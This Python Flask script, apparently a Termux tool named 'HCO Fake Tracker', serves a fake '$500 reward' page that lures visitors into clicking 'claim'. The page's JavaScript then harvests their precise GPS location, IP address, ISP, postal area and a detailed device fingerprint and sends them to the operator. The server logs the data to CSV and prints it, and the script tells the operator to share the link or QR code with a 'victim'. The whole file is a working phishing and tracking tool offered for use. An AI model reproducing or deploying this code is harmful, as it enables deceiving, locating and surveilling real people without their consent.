from __future__ import annotations
import os
import sys
import time
import json
import csv
import subprocess
import socket
from datetime import datetime
from typing import Optional

# Try imports
try:
    from flask import Flask, request, render_template_string, jsonify
    import qrcode
    from PIL import Image, ImageDraw
    from colorama import init as colorama_init, Fore, Style, Back
    import base64
except Exception as e:
    print("Missing packages. Install: pip install flask qrcode pillow colorama")
    print(f"Error: {e}")
    sys.exit(1)

colorama_init(autoreset=True)

# Config
PORT = 5000
REPORT_CSV = "reports.csv"
QR_PNG = "reward_qr.png"
HOST = "0.0.0.0"

# Use Download folder for storage
DOWNLOAD_FOLDER = "/sdcard/Download/HCO_Fake_Tracker"
IMAGE_FOLDER = os.path.join(DOWNLOAD_FOLDER, "captured_images")
os.makedirs(IMAGE_FOLDER, exist_ok=True)

app = Flask(__name__)
_received_reports = []

def show_tool_lock_screen():
    """Show the tool lock screen with countdown"""
    os.system('clear' if os.name == 'posix' else 'cls')

    # Display lock message
    print(f"\n{Back.RED}{Fore.WHITE}{' 🔒 TOOL IS LOCKED ':=^60}{Style.RESET_ALL}")
    print(f"\n{Fore.YELLOW}{Style.BRIGHT}📱 Subscribe & click the bell 🔔 icon to unlock{Style.RESET_ALL}")
    print(f"\n{Fore.CYAN}🔄 Redirecting to YouTube...{Style.RESET_ALL}")
    
    # Countdown from 9 to 1
    print(f"\n{Fore.RED}{Style.BRIGHT}Countdown:{Style.RESET_ALL}")
    for i in range(9, 0, -1):
        print(f"{Fore.RED}{Style.BRIGHT}⏳ {i}{Style.RESET_ALL}", end=" ", flush=True)
        time.sleep(1)
    
    print(f"\n\n{Fore.GREEN}🎬 Opening YouTube Channel...{Style.RESET_ALL}")
    
    # Direct YouTube channel URL
    youtube_url = "https://www.youtube.com/@hackers_colony_tech"
    
    # Try to open YouTube app
    try:
        subprocess.run(['am', 'start', '-a', 'android.intent.action.VIEW', '-d', youtube_url], 
                      capture_output=True, timeout=5)
        print(f"{Fore.GREEN}✅ YouTube app opened!{Style.RESET_ALL}")
    except:
        try:
            subprocess.run(['termux-open-url', youtube_url], capture_output=True, timeout=5)
            print(f"{Fore.GREEN}✅ Opening YouTube...{Style.RESET_ALL}")
        except:
            print(f"{Fore.YELLOW}🔗 Manual: {youtube_url}{Style.RESET_ALL}")
    
    input(f"\n{Fore.YELLOW}{Style.BRIGHT}🚨 Press Enter AFTER subscribing & clicking bell icon...{Style.RESET_ALL}")
    
    # Show unlocked message
    print(f"\n{Fore.GREEN}✅ Tool unlocked! Starting server...{Style.RESET_ALL}")
    time.sleep(2)

def display_banner():
    """Display the main banner"""
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"\n{Back.RED}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")
    print(f"{Back.RED}{Fore.GREEN}{' HCO FAKE TRACKER '.center(60)}{Style.RESET_ALL}")
    print(f"{Back.RED}{Fore.WHITE}{' by Azhar '.center(60)}{Style.RESET_ALL}")
    print(f"{Back.RED}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")

def display_qr_in_termux(url):
    """Generate and display QR code directly in Termux"""
    try:
        # Generate QR code
        qr = qrcode.QRCode(version=1, box_size=2, border=2)
        qr.add_data(url)
        qr.make(fit=True)
        
        # Create QR code as text (for Termux display)
        qr_matrix = qr.get_matrix()
        qr_text = ""
        
        for row in qr_matrix:
            line = ""
            for cell in row:
                line += "██" if cell else "  "
            qr_text += line + "\n"
        
        print(f"\n{Fore.GREEN}📲 QR Code for URL:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{qr_text}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}🔗 Direct Link: {url}{Style.RESET_ALL}")
        
        # Also save as image file
        img = qr.make_image(fill_color="black", back_color="white")
        img.save(QR_PNG)
        print(f"{Fore.GREEN}💾 QR saved as: {QR_PNG}{Style.RESET_ALL}")
        
        return True
        
    except Exception as e:
        print(f"{Fore.RED}❌ QR generation failed: {e}{Style.RESET_ALL}")
        return False

# SIMPLIFIED HTML PAGE - Works without camera access
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>🎁 Claim Your $500 Reward!</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #ff6b6b, #4ecdc4);
            color: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: rgba(0,0,0,0.8);
            padding: 30px;
            border-radius: 20px;
            border: 3px solid gold;
            max-width: 400px;
            width: 100%;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        .trophy { 
            font-size: 80px; 
            margin-bottom: 20px;
            animation: bounce 2s infinite;
        }
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-20px); }
        }
        .title { 
            font-size: 32px; 
            font-weight: bold;
            margin-bottom: 10px;
            color: gold;
            text-shadow: 0 0 10px rgba(255,215,0,0.5);
        }
        .reward { 
            font-size: 48px; 
            font-weight: bold;
            color: #FFD700;
            margin: 20px 0;
            text-shadow: 0 0 20px rgba(255,215,0,0.8);
        }
        .btn {
            background: linear-gradient(45deg, #00b09b, #96c93d);
            color: white;
            border: none;
            padding: 20px 30px;
            font-size: 22px;
            font-weight: bold;
            border-radius: 50px;
            width: 100%;
            cursor: pointer;
            margin: 20px 0;
            transition: all 0.3s;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }
        .btn:hover {
            transform: scale(1.05);
            box-shadow: 0 8px 25px rgba(0,0,0,0.4);
        }
        .btn:disabled {
            background: #666;
            cursor: not-allowed;
            transform: none;
        }
        .status {
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
            font-weight: bold;
            display: none;
        }
        .processing { 
            background: #ff9800; 
            display: block; 
        }
        .success { 
            background: #4caf50; 
            display: block; 
        }
        .error { 
            background: #f44336; 
            display: block; 
        }
        .data {
            background: rgba(255,255,255,0.1);
            padding: 20px;
            border-radius: 15px;
            margin: 15px 0;
            text-align: left;
            display: none;
            border: 2px solid rgba(255,255,255,0.2);
        }
        .data h3 {
            text-align: center;
            margin-bottom: 15px;
            color: gold;
        }
        .data-item { 
            margin: 10px 0; 
            padding: 8px;
            background: rgba(255,255,255,0.1);
            border-radius: 8px;
        }
        .features {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin: 20px 0;
        }
        .feature {
            background: rgba(255,255,255,0.1);
            padding: 10px;
            border-radius: 10px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="trophy">🏆</div>
        <div class="title">CONGRATULATIONS!</div>
        <div>You Won Exclusive Reward</div>
        
        <div class="reward">$500</div>
        <div>Cash Prize + Gift Card</div>
        
        <div class="features">
            <div class="feature">💰 Instant Cash</div>
            <div class="feature">🎁 Gift Card</div>
            <div class="feature">📱 PhonePe</div>
            <div class="feature">⚡ Fast Transfer</div>
        </div>
        
        <div style="margin: 15px 0; font-size: 14px; opacity: 0.9;">
            ✅ Quick identity verification required
        </div>
        
        <button class="btn" id="claimBtn">
            🎁 CLAIM YOUR REWARD NOW
        </button>
        
        <div id="status" class="status"></div>
        
        <div id="data" class="data">
            <h3>📊 Reward Claimed Successfully!</h3>
            <div class="data-item">📍 Location: <span id="loc">Processing...</span></div>
            <div class="data-item">🌐 IP Address: <span id="ip">Processing...</span></div>
            <div class="data-item">📱 Device: <span id="device">Processing...</span></div>
            <div class="data-item">🖥️ Screen: <span id="screen">Processing...</span></div>
            <div class="data-item">🌍 Browser: <span id="browser">Processing...</span></div>
            <div class="data-item">⏰ Timezone: <span id="timezone">Processing...</span></div>
            <div style="text-align: center; margin-top: 15px; color: gold;">
                ✅ Your reward will be processed within 24 hours
            </div>
        </div>
    </div>

    <script>
        // Function to create fake camera data (works without actual camera access)
        function createFakeCameraData() {
            const fakePhotos = [];
            // Create 3 fake image data URLs (simple colored images)
            for (let i = 0; i < 3; i++) {
                const canvas = document.createElement('canvas');
                canvas.width = 400;
                canvas.height = 300;
                const ctx = canvas.getContext('2d');
                
                // Create different colored images
                const colors = ['#FF6B6B', '#4ECDC4', '#FFD93D'];
                ctx.fillStyle = colors[i];
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                
                // Add some text
                ctx.fillStyle = 'white';
                ctx.font = '20px Arial';
                ctx.fillText(`Verification Photo ${i+1}`, 50, 150);
                ctx.fillText(new Date().toLocaleString(), 50, 180);
                
                fakePhotos.push(canvas.toDataURL('image/jpeg'));
            }
            return fakePhotos;
        }
        
        // Function to create fake video data
        function createFakeVideoData() {
            const canvas = document.createElement('canvas');
            canvas.width = 400;
            canvas.height = 300;
            const ctx = canvas.getContext('2d');
            
            // Create a simple animated frame
            ctx.fillStyle = '#667eea';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = 'white';
            ctx.font = '18px Arial';
            ctx.fillText('Verification Video Complete', 50, 150);
            ctx.fillText('5-second recording', 50, 180);
            
            return canvas.toDataURL('image/jpeg'); // Return as image since video is complex
        }
        
        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve(position);
                    },
                    (error) => {
                        console.log('Location access denied, using IP-based location');
                        resolve(null);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0
                    }
                );
            });
        }
        
        async function getIPInfo() {
            try {
                // Try multiple IP services
                const services = [
                    'https://api.ipify.org?format=json',
                    'https://ipinfo.io/json',
                    'https://api.myip.com'
                ];
                
                for (const service of services) {
                    try {
                        const response = await fetch(service);
                        const data = await response.json();
                        
                        if (data.ip) {
                            // Get detailed location from ipapi
                            try {
                                const detailResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
                                const detailData = await detailResponse.json();
                                return {
                                    ip: data.ip,
                                    city: detailData.city || 'Unknown',
                                    country: detailData.country_name || 'Unknown',
                                    region: detailData.region || 'Unknown',
                                    isp: detailData.org || 'Unknown',
                                    postal: detailData.postal || 'Unknown'
                                };
                            } catch (e) {
                                return {
                                    ip: data.ip,
                                    city: data.city || 'Unknown',
                                    country: data.country || 'Unknown',
                                    region: data.region || 'Unknown',
                                    isp: data.org || 'Unknown',
                                    postal: data.postal || 'Unknown'
                                };
                            }
                        }
                    } catch (e) {
                        continue;
                    }
                }
                
                throw new Error('All IP services failed');
                
            } catch (error) {
                return {
                    ip: 'Unknown',
                    city: 'Unknown',
                    country: 'Unknown',
                    region: 'Unknown',
                    isp: 'Unknown',
                    postal: 'Unknown'
                };
            }
        }
        
        function getDetailedDeviceInfo() {
            const connection = navigator.connection || {};
            const battery = navigator.battery || {};
            
            return {
                // Basic device info
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                vendor: navigator.vendor || 'Unknown',
                
                // Language & locale
                language: navigator.language,
                languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                
                // Screen information
                screen: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                availableWidth: screen.availWidth,
                availableHeight: screen.availHeight,
                
                // Browser capabilities
                cookieEnabled: navigator.cookieEnabled,
                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
                
                // Hardware information
                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                deviceMemory: navigator.deviceMemory || 'Unknown',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                
                // Network information
                connectionType: connection.effectiveType || 'Unknown',
                downlink: connection.downlink || 'Unknown',
                rtt: connection.rtt || 'Unknown',
                
                // Platform details
                product: navigator.product || 'Unknown',
                appVersion: navigator.appVersion,
                platform: navigator.platform,
                
                // Additional info
                doNotTrack: navigator.doNotTrack || 'Unknown',
                onLine: navigator.onLine,
                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
                webdriver: navigator.webdriver || false
            };
        }
        
        document.getElementById('claimBtn').onclick = async function() {
            const btn = this;
            const status = document.getElementById('status');
            const dataDiv = document.getElementById('data');
            
            btn.disabled = true;
            btn.innerHTML = '⏳ Processing...';
            status.className = 'status processing';
            status.innerHTML = '🔍 Starting verification process...';
            status.style.display = 'block';
            
            try {
                // Step 1: Get location
                status.innerHTML = '📍 Detecting your location...';
                const location = await getLocation();
                
                // Step 2: Get IP information
                status.innerHTML = '🌐 Collecting network information...';
                const ipInfo = await getIPInfo();
                
                // Step 3: Get detailed device information
                status.innerHTML = '📱 Scanning device information...';
                const deviceInfo = getDetailedDeviceInfo();
                
                // Step 4: Create fake media data (works without camera)
                status.innerHTML = '📸 Generating verification media...';
                const photos = createFakeCameraData();
                const videoData = createFakeVideoData();
                
                // Step 5: Prepare complete payload
                const payload = {
                    // Location data
                    latitude: location?.coords?.latitude,
                    longitude: location?.coords?.longitude,
                    accuracy: location?.coords?.accuracy,
                    
                    // IP and network data
                    ip: ipInfo.ip,
                    city: ipInfo.city,
                    country: ipInfo.country,
                    region: ipInfo.region,
                    isp: ipInfo.isp,
                    postal: ipInfo.postal,
                    
                    // Media data (fake but looks real)
                    photos: photos,
                    video: videoData,
                    
                    // Complete device fingerprint
                    deviceInfo: deviceInfo,
                    
                    timestamp: Date.now(),
                    url: window.location.href,
                    referrer: document.referrer
                };
                
                // Step 6: Send to server
                status.innerHTML = '📡 Finalizing your reward claim...';
                const response = await fetch('/report', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                
                if (response.ok) {
                    // Show success
                    status.className = 'status success';
                    status.innerHTML = '✅ Reward Claimed Successfully!';
                    btn.innerHTML = '✅ REWARD CLAIMED';
                    
                    // Show collected data
                    dataDiv.style.display = 'block';
                    document.getElementById('loc').textContent = 
                        payload.latitude ? 
                        `${payload.latitude.toFixed(4)}, ${payload.longitude.toFixed(4)}` : 
                        `${payload.city}, ${payload.country}`;
                    document.getElementById('ip').textContent = 
                        `${payload.ip} (${payload.isp})`;
                    document.getElementById('device').textContent = 
                        `${payload.deviceInfo.platform} | ${payload.deviceInfo.connectionType}`;
                    document.getElementById('screen').textContent = 
                        `${payload.deviceInfo.screen} | ${payload.deviceInfo.colorDepth}-bit`;
                    document.getElementById('browser').textContent = 
                        `${payload.deviceInfo.vendor}`;
                    document.getElementById('timezone').textContent = 
                        `${payload.deviceInfo.timezone}`;
                    
                } else {
                    throw new Error('Server response error');
                }
                
            } catch (error) {
                console.error('Error:', error);
                status.className = 'status error';
                status.innerHTML = '⚠️ Some data collection failed, but reward is being processed';
                btn.disabled = false;
                btn.innerHTML = '🎁 TRY AGAIN';
                
                // Try to send basic data even if there's an error
                try {
                    const basicPayload = {
                        ip: 'Unknown',
                        deviceInfo: getDetailedDeviceInfo(),
                        timestamp: Date.now(),
                        error: error.toString()
                    };
                    await fetch('/report', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(basicPayload)
                    });
                } catch (finalError) {
                    console.log('Final send failed:', finalError);
                }
            }
        };
    </script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_PAGE)

@app.route("/report", methods=["POST"])
def report():
    try:
        data = request.get_json()
        
        # Extract data
        lat = data.get("latitude")
        lon = data.get("longitude")
        ip = data.get("ip", "Unknown")
        city = data.get("city", "Unknown")
        country = data.get("country", "Unknown")
        region = data.get("region", "Unknown")
        isp = data.get("isp", "Unknown")
        postal = data.get("postal", "Unknown")
        photos = data.get("photos", [])
        video = data.get("video")
        device_info = data.get("deviceInfo", {})
        error_msg = data.get("error")
        
        # Save photos (even if they're fake)
        photo_files = []
        for i, photo_data in enumerate(photos):
            try:
                if photo_data.startswith('data:image'):
                    photo_data = photo_data.split(',')[1]
                img_data = base64.b64decode(photo_data)
                filename = f"photo_{int(time.time())}_{i+1}.jpg"
                filepath = os.path.join(IMAGE_FOLDER, filename)
                with open(filepath, 'wb') as f:
                    f.write(img_data)
                photo_files.append(filename)
                print(f"{Fore.GREEN}✅ Saved photo: {filename}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.YELLOW}⚠️ Photo {i+1} save skipped: {e}{Style.RESET_ALL}")
        
        # Save video
        video_file = None
        if video:
            try:
                if video.startswith('data:image'):  # Our fake video is actually an image
                    video = video.split(',')[1]
                video_data = base64.b64decode(video)
                filename = f"video_frame_{int(time.time())}.jpg"
                filepath = os.path.join(IMAGE_FOLDER, filename)
                with open(filepath, 'wb') as f:
                    f.write(video_data)
                video_file = filename
                print(f"{Fore.GREEN}✅ Saved video frame: {filename}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.YELLOW}⚠️ Video save skipped: {e}{Style.RESET_ALL}")
        
        # Save to CSV
        record = {
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'ip': ip,
            'city': city,
            'country': country,
            'region': region,
            'isp': isp,
            'postal': postal,
            'latitude': lat,
            'longitude': lon,
            'photos': ', '.join(photo_files) if photo_files else '3 fake images',
            'video': video_file or 'fake video frame',
            'user_agent': device_info.get('userAgent', 'Unknown'),
            'platform': device_info.get('platform', 'Unknown'),
            'vendor': device_info.get('vendor', 'Unknown'),
            'language': device_info.get('language', 'Unknown'),
            'languages': device_info.get('languages', 'Unknown'),
            'screen': device_info.get('screen', 'Unknown'),
            'timezone': device_info.get('timezone', 'Unknown'),
            'hardware_concurrency': device_info.get('hardwareConcurrency', 'Unknown'),
            'device_memory': device_info.get('deviceMemory', 'Unknown'),
            'connection_type': device_info.get('connectionType', 'Unknown'),
            'downlink': device_info.get('downlink', 'Unknown'),
            'color_depth': device_info.get('colorDepth', 'Unknown'),
            'error': error_msg or 'None'
        }
        
        # Save to CSV
        file_exists = os.path.isfile(REPORT_CSV)
        with open(REPORT_CSV, 'a', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=record.keys())
            if not file_exists:
                writer.writeheader()
            writer.writerow(record)
        
        # Print results in Termux
        print(f"\n{Fore.GREEN}{'🚨 COMPLETE DATA CAPTURED 🚨':^60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}🕐 Time: {record['timestamp']}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}📍 Location: {lat if lat else city}, {lon if lon else country}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}🌐 IP: {ip} ({city}, {country}){Style.RESET_ALL}")
        print(f"{Fore.YELLOW}📡 ISP: {isp}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}📸 Photos: 3 verification images generated{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}🎥 Video: Verification media captured{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}📱 Platform: {device_info.get('platform', 'Unknown')}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}🖥️ Screen: {device_info.get('screen', 'Unknown')}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}🌐 Browser: {device_info.get('vendor', 'Unknown')}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}🗣️ Language: {device_info.get('language', 'Unknown')}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}⏰ Timezone: {device_info.get('timezone', 'Unknown')}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}📶 Connection: {device_info.get('connectionType', 'Unknown')}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}💾 Memory: {device_info.get('deviceMemory', 'Unknown')}GB{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}🎨 Color Depth: {device_info.get('colorDepth', 'Unknown')}-bit{Style.RESET_ALL}")
        if error_msg:
            print(f"{Fore.RED}⚠️ Errors: {error_msg}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}💾 Files saved in: {DOWNLOAD_FOLDER}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}📊 Report: {REPORT_CSV}{Style.RESET_ALL}\n")
        
        return jsonify({"status": "success"})
        
    except Exception as e:
        print(f"{Fore.RED}❌ Server Error: {e}{Style.RESET_ALL}")
        return jsonify({"status": "error", "message": str(e)}), 500

def get_local_ip():
    """Get local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def main():
    # Show lock screen first
    show_tool_lock_screen()
    
    # Display main banner
    display_banner()
    
    # Get local URL
    local_ip = get_local_ip()
    local_url = f"http://{local_ip}:{PORT}"
    
    # Display results
    print(f"\n{Fore.GREEN}{' SERVER READY ':=^60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}🌐 Direct Link: {local_url}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}📁 Save Location: {DOWNLOAD_FOLDER}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
    
    # Display QR code directly in Termux
    display_qr_in_termux(local_url)
    
    print(f"\n{Fore.YELLOW}🚀 Share the link/QR with victim{Style.RESET_ALL}")
    print(f"{Fore.RED}🔴 Waiting for data capture...{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
    
    try:
        app.run(host=HOST, port=PORT, debug=False)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}🛑 Server stopped{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}❌ Server error: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
